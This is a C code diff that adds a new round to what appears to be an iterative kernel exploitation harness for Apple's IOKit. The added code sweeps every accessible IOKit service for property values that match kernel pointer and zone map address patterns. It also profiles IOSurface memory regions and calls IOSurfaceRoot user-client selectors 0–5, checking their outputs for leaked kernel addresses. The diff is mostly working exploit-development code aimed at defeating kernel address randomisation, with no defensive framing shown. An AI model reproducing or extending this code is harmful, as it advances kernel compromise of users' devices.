@@ -17027,7 +17027,7 @@ new_modes:
             rlog("*** rounds=%d: fast-path to Phase 16 ***\n", rounds);
             goto phase15_done;
         }
-        if (rounds >= 170 && rounds <= 199) {
+        if (rounds >= 170 && rounds <= 210) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
@@ -23074,6 +23074,224 @@ new_modes:
                     CVPixelBufferRelease(enc_pb);
                 }
                 rlog("=== r=195 complete ===\n");
+            }
+
+            if (rounds == 196) {
+                /*
+                 * r=196: Broad IOKit registry property sweep.
+                 *
+                 * Enumerate ALL accessible IOKit services and their
+                 * properties. Scan every numeric value for kernel
+                 * pointer patterns. Also check vm_region object_id
+                 * patterns across many IOSurface allocations.
+                 */
+                rlog("=== r=196: IOKit registry sweep ===\n");
+
+                /* Part A: Enumerate IOKit services */
+                rlog("\n  --- Part A: IOKit service enumeration ---\n");
+                io_iterator_t iter196 = 0;
+                kern_return_t kr196 = IORegistryEntryCreateIterator(
+                    kIOMasterPortDefault, "IOService",
+                    kIORegistryIterateRecursively, &iter196);
+                rlog("  Iterator create: kr=0x%x\n", kr196);
+
+                int svc_count = 0, kptr_found = 0;
+                io_registry_entry_t entry196;
+                while ((entry196 = IOIteratorNext(iter196)) && svc_count < 200) {
+                    io_name_t name196;
+                    IORegistryEntryGetName(entry196, name196);
+
+                    CFMutableDictionaryRef props196 = NULL;
+                    kern_return_t pkr = IORegistryEntryCreateCFProperties(
+                        entry196, &props196, NULL, 0);
+
+                    if (pkr == KERN_SUCCESS && props196) {
+                        CFIndex nk196 = CFDictionaryGetCount(props196);
+                        const void **keys196 = malloc(nk196 * sizeof(void*));
+                        const void **vals196 = malloc(nk196 * sizeof(void*));
+                        CFDictionaryGetKeysAndValues(props196, keys196, vals196);
+
+                        for (CFIndex ki = 0; ki < nk196; ki++) {
+                            char kb196[128] = {0};
+                            if (CFGetTypeID(keys196[ki]) == CFStringGetTypeID())
+                                CFStringGetCString(keys196[ki], kb196,
+                                    sizeof(kb196), kCFStringEncodingUTF8);
+
+                            if (CFGetTypeID(vals196[ki]) == CFNumberGetTypeID()) {
+                                int64_t nv196 = 0;
+                                CFNumberGetValue(vals196[ki],
+                                    kCFNumberSInt64Type, &nv196);
+                                uint64_t uv = (uint64_t)nv196;
+                                uint64_t ut = (uv & 0xF000FFFFFFFFFFFFULL) |
+                                    ((uv & 0x00F0000000000000ULL) ?
+                                     0xFFF0000000000000ULL : 0);
+                                if ((ut & 0xFFFFFF0000000000ULL) ==
+                                    0xFFFFFE0000000000ULL) {
+                                    rlog("  *** KPTR svc='%s' key='%s'"
+                                         " val=0x%016llx ***\n",
+                                         name196, kb196,
+                                         (unsigned long long)uv);
+                                    kptr_found++;
+                                }
+                                /* Also check for zone map range */
+                                if (uv > 0xFFFFFE1000000000ULL &&
+                                    uv < 0xFFFFFE4000000000ULL) {
+                                    rlog("  *** ZONE svc='%s' key='%s'"
+                                         " val=0x%016llx ***\n",
+                                         name196, kb196,
+                                         (unsigned long long)uv);
+                                    kptr_found++;
+                                }
+                            } else if (CFGetTypeID(vals196[ki]) == CFDataGetTypeID()) {
+                                CFDataRef d196 = vals196[ki];
+                                CFIndex dlen = CFDataGetLength(d196);
+                                const uint8_t *dp = CFDataGetBytePtr(d196);
+                                for (CFIndex b = 0; b + 7 < dlen && b < 512; b += 8) {
+                                    uint64_t v;
+                                    memcpy(&v, dp + b, 8);
+                                    uint64_t ut = (v & 0xF000FFFFFFFFFFFFULL) |
+                                        ((v & 0x00F0000000000000ULL) ?
+                                         0xFFF0000000000000ULL : 0);
+                                    if ((ut & 0xFFFFFF0000000000ULL) ==
+                                        0xFFFFFE0000000000ULL) {
+                                        rlog("  *** KPTR svc='%s' key='%s'"
+                                             " @%ld=0x%016llx ***\n",
+                                             name196, kb196,
+                                             (long)b, (unsigned long long)v);
+                                        kptr_found++;
+                                    }
+                                }
+                            }
+                        }
+                        free(keys196);
+                        free(vals196);
+                        CFRelease(props196);
+                    }
+                    IOObjectRelease(entry196);
+                    svc_count++;
+                }
+                IOObjectRelease(iter196);
+                rlog("  Scanned %d services, found %d KPTRs\n",
+                     svc_count, kptr_found);
+
+                /* Part B: vm_region object_id correlation */
+                rlog("\n  --- Part B: vm_region object_id analysis ---\n");
+                CFMutableDictionaryRef sp196 = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int w196 = 32, h196 = 32, bpe196 = 4;
+                CFNumberRef wn196 = CFNumberCreate(NULL, kCFNumberIntType, &w196);
+                CFNumberRef hn196 = CFNumberCreate(NULL, kCFNumberIntType, &h196);
+                CFNumberRef bn196 = CFNumberCreate(NULL, kCFNumberIntType, &bpe196);
+                int pf196 = 0x42475241;
+                CFNumberRef pfn196 = CFNumberCreate(NULL, kCFNumberIntType, &pf196);
+                CFDictionarySetValue(sp196, CFSTR("IOSurfaceWidth"), wn196);
+                CFDictionarySetValue(sp196, CFSTR("IOSurfaceHeight"), hn196);
+                CFDictionarySetValue(sp196, CFSTR("IOSurfaceBytesPerElement"), bn196);
+                CFDictionarySetValue(sp196, CFSTR("IOSurfacePixelFormat"), pfn196);
+
+                IOSurfaceRef surfs196[16];
+                for (int i = 0; i < 16; i++) {
+                    surfs196[i] = IOSurfaceCreate(sp196);
+                    if (surfs196[i]) {
+                        void *ba = IOSurfaceGetBaseAddress(surfs196[i]);
+                        uint64_t addr = (uint64_t)ba;
+                        uint64_t sz = 0;
+                        uint32_t depth = 0;
+                        vm_region_submap_info_data_64_t vi;
+                        mach_msg_type_number_t vc = VM_REGION_SUBMAP_INFO_COUNT_64;
+                        mach_vm_region_recurse(mach_task_self(),
+                            &addr, &sz, &depth, (vm_region_recurse_info_t)&vi, &vc);
+                        rlog("  Surf[%d] ID=%u base=%p oid=0x%x tag=%d share=%d\n",
+                             i, IOSurfaceGetID(surfs196[i]), ba,
+                             vi.object_id, vi.user_tag, vi.share_mode);
+                    }
+                }
+                for (int i = 0; i < 16; i++) {
+                    if (surfs196[i]) CFRelease(surfs196[i]);
+                }
+                CFRelease(sp196);
+                CFRelease(wn196); CFRelease(hn196); CFRelease(bn196); CFRelease(pfn196);
+
+                /* Part C: IOKit user client connection properties */
+                rlog("\n  --- Part C: IOKit connection properties ---\n");
+                io_service_t svc196 = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+                if (svc196) {
+                    io_connect_t c196;
+                    IOServiceOpen(svc196, mach_task_self(), 0, &c196);
+                    if (c196) {
+                        /* Try IOConnectGetService to get the service */
+                        io_service_t parent196 = IO_OBJECT_NULL;
+                        IOConnectGetService(c196, &parent196);
+                        if (parent196) {
+                            CFMutableDictionaryRef pp196 = NULL;
+                            IORegistryEntryCreateCFProperties(parent196,
+                                &pp196, NULL, 0);
+                            if (pp196) {
+                                CFIndex nk = CFDictionaryGetCount(pp196);
+                                rlog("  IOSurfaceRoot service: %ld props\n",
+                                     (long)nk);
+                                const void **pk = malloc(nk * sizeof(void*));
+                                const void **pv = malloc(nk * sizeof(void*));
+                                CFDictionaryGetKeysAndValues(pp196, pk, pv);
+                                for (CFIndex ki = 0; ki < nk && ki < 20; ki++) {
+                                    char kb[128] = {0};
+                                    if (CFGetTypeID(pk[ki]) == CFStringGetTypeID())
+                                        CFStringGetCString(pk[ki], kb,
+                                            sizeof(kb), kCFStringEncodingUTF8);
+                                    if (CFGetTypeID(pv[ki]) == CFNumberGetTypeID()) {
+                                        int64_t nv = 0;
+                                        CFNumberGetValue(pv[ki],
+                                            kCFNumberSInt64Type, &nv);
+                                        rlog("  '%s' = 0x%llx\n", kb,
+                                             (unsigned long long)(uint64_t)nv);
+                                    } else {
+                                        rlog("  '%s' type=%lu\n", kb,
+                                             (unsigned long)CFGetTypeID(pv[ki]));
+                                    }
+                                }
+                                free(pk); free(pv);
+                                CFRelease(pp196);
+                            }
+                            IOObjectRelease(parent196);
+                        }
+
+                        /* Try selectors that might return connection metadata */
+                        for (uint32_t sel = 0; sel <= 5; sel++) {
+                            uint64_t sco[16];
+                            uint32_t scc = 16;
+                            memset(sco, 0, sizeof(sco));
+                            uint8_t sob[256];
+                            memset(sob, 0, sizeof(sob));
+                            size_t sosz = sizeof(sob);
+                            uint64_t sci[4] = {0};
+
+                            kern_return_t skr = IOConnectCallMethod(c196, sel,
+                                sci, 1, NULL, 0, sco, &scc, sob, &sosz);
+                            if (skr == KERN_SUCCESS) {
+                                rlog("  sel%u: scc=%u sosz=%zu\n",
+                                     sel, scc, sosz);
+                                for (uint32_t j = 0; j < scc; j++) {
+                                    if (sco[j] != 0) {
+                                        rlog("    sco[%u]=0x%llx\n", j,
+                                             (unsigned long long)sco[j]);
+                                        uint64_t v = sco[j];
+                                        uint64_t ut = (v & 0xF000FFFFFFFFFFFFULL) |
+                                            ((v & 0x00F0000000000000ULL) ?
+                                             0xFFF0000000000000ULL : 0);
+                                        if ((ut & 0xFFFFFF0000000000ULL) ==
+                                            0xFFFFFE0000000000ULL)
+                                            rlog("    *** KPTR ***\n");
+                                    }
+                                }
+                            }
+                        }
+                        IOServiceClose(c196);
+                    }
+                    IOObjectRelease(svc196);
+                }
+
+                rlog("=== r=196 complete ===\n");
             }
 
             IOServiceClose(conn17);
